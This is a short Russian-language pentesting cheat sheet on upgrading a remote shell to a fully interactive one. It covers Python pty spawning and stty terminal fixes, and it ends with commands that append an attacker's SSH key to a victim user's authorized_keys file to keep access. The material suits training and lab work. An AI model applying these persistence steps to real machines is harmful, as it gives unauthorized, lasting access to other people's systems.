## Обновление Shell

Часто можно просто запустить `/bin/bash` или аналогичный процесс, чтобы получить более совершенный shell.

Используйте `echo "$SHELL"` чтобы определить используемый shell. Затем указайте полный путь к этому shell, и иногда он запустит более совершенный, более интерактивный shell.

```bash
┌──(mac㉿kali)-[~]
└─$ echo "$SHELL"
/bin/bash
┌──(mac㉿kali)-[~]
└─$ /bin/bash
```

### Использование Python для запуска /bin/bash

```bash
which bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Трюк с фоновым запуском Shell

Внутри вашего shell, возможно, после запуска процесса `/bin/bash` с помощью Python, выполните следующие действия, чтобы исправить интерактивность в shell:

- Нажмите `Ctrl + z`, чтобы отправить процесс в фоновое состояние
- Выполните команду `stty raw -echo` на вашем хост-компьютере
- Напишите `fg` на хосте (это не будет видно на экране)
- Нажмите клавишу `Enter` дважды

Теперь у вас должен быть интерактивный shell!

Затем вы можете выполнить `export TERM=xterm`, чтобы разрешить очистку терминала.

Если линии на экране выглядят неправильно, возможно, вам нужно перенастроить колонки и строки в новом shell. Сделайте следующее:

- Выполните `stty -a` на хост-компьютере и запишите число строк и колонок
- В новом shell выполните `stty rows Y cols X`, где Y — количество строк, а X — количество колонок

*Примечание:* Это не работает в meterpreter или metasploit shells в целом.

### Использование shell для создания SSH-ключа

Это один из наиболее надежных способов получить интерактивный shell — если у вас есть права на это.

Сначала сгенерируйте пару ключей для доступа к системе (делайте это на хост-компьютере):

```bash
$ ssh-keygen -f key_name
```

Затем прочитайте публичный ключ и скопируйте его в буфер обмена:

```bash
$ cat key_name.pub
```

На жертвенном компьютере найдите пользователя, которого вы хотите удаленно получить доступ к — в этом примере, `victim`:

```bash
$ echo 'CONTENTS_OF_KEY' >> /home/victim/.ssh/authorized_keys
```

Затем войдите через SSH с хоста:

```bash
ssh -i key_name victim@IP_ADDRESS
```
